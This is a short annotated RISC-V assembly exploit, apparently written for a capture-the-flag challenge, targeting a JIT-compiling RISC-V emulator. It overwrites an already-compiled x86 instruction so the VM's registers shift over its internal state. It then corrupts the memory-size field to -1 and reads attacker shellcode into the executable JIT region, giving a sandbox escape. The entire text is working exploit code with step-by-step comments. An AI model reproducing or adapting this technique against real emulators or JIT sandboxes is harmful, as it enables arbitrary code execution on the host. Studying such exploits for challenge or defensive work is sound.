# Instruction that will be partially smashed. Upper part of immediate remains (`40 90`), opcode and
# lower part are overwritten with `48 83 c7`. This results in the instructions `add rdi, 0x40; nop`,
# which shifts the registers to overlap with the rest of the VM state.
start: lui zero, 0x90400

# After registers are shifted: Set `mem_size` to -1
li x18, -1
li x19, -1
# Check to see if our registers were shifted. This also restores the registers.
beq x16, x17, smash
# Registers are restored, but `mem_size` remains corrupted

# Read shellcode into the JIT region
li a0, 0x10000
li a1, 0x2000
li a7, 1
ecall
# Fall through to block that was already executed, to avoid JITing additional code

# Overwrite first instruction in JIT code
smash: li t0, 0xc78348cc
li t1, 0xffff
sw t0, 0(t1)
# Jump to overwritten instruction
j start
